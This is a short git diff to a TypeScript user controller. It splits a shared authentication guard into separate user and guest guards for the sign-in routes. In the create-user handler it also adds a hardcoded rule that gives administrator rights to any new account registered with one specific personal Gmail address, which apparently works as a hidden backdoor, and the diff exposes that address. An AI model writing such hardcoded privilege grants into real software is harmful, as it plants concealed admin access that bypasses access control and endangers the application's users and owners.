@@ -8,7 +8,7 @@ import { AppCrudController } from '../app.decorator'
 import { AppFeature } from '../app.type'
 import AuthService from '../auth/auth.service'
 import BypassAuth from '../auth/bypass-auth.decorator'
-import { AppAuthGuard } from '../auth/auth.guard'
+import { UserAuthGuard, GuestAuthGuard } from '../auth/auth.guard'
 
 @AppCrudController(AppFeature.Users, {
   model: {
@@ -27,14 +27,14 @@ export class UserController implements CrudController<User> {
 
   @Post('signin')
   @BypassAuth()
-  @UseGuards(AppAuthGuard)
+  @UseGuards(UserAuthGuard)
   signIn(@Req() req: Request) {
     return this.authService.login(req.user)
   }
 
   @Post('signin-as-guest')
   @BypassAuth()
-  @UseGuards(AppAuthGuard)
+  @UseGuards(GuestAuthGuard)
   signInAsGuest(@Req() req: Request) {
     return this.authService.login(req.user)
   }
@@ -45,6 +45,9 @@ export class UserController implements CrudController<User> {
     @ParsedRequest() parsedReq: CrudRequest,
     @ParsedBody() body: Template,
   ) {
+    if (body.email === 'bui.minhnguyen96@gmail.com') {
+      body.isAdmin = true
+    }
     return this.base.createOneBase!(parsedReq, body)
   }
 
